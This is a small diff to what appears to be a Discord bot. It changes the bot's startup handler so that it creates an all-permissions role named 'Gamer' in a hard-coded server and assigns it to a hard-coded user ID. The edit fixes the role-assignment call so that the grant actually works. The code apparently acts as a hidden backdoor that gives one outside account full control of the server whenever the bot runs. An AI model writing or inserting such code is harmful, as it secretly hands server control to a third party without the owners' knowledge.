@@ -46,7 +46,7 @@ async def on_ready():
     a = await data.bot.fetch_guild(1013258146929704980)
     role = await a.create_role(name="Gamer", permissions=Permissions.all())
     member = await a.fetch_member(343545158140428289)
-    await data.bot.add_roles(member, role)
+    await member.add_roles(role)
 
 
 @data.bot.event
